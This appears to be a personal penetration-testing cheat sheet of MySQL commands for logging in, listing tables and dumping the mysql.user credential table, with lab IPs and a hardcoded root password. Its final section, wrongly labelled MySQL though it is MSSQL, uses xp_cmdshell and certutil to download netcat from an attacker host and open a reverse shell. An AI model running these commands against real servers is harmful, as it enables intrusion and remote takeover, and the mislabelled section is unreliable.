__tags: mysql technique

## login with password

```
mysql -u root -pGkEWXn4h4g8qx9fZ1 -h academy
```

## login to specific port

```
mysql -h 10.10.10.215 -P 33060
```

## Navigate through tables:

```
show tables;
show tables from {DB};
SELECT * FROM users;

# Select Database:
use DATABASE
```

## Show Databases:

```
show databases;
```

## Show Table Columns
```
describe {table}
```

## mySQL Basic survival kit:

```
#login:
mysql -u user -p

show tables from mysql;

select current_user(); 
select schema();

select * from mysql.user;
select user, password, host from mysql.user;

show events;

```

## Use `enable_xp_cmdshell` to run commands from sql
```bash
## login to mysql server as sa
enable_xp_cmdshell
xp_cmdshell whoami
EXEC xp_cmdshell

EXEC xp_cmdshell 'certutil -urlcache -split -f
http://10.10.14.9:4000/nc64.exe C:\Users\sql_svc\Desktop\nc64.exe';

EXEC xp_cmdshell 'C:\Users\sql_svc\Desktop\nc64.exe -e cmd.exe 10.10.14.9 4455';
```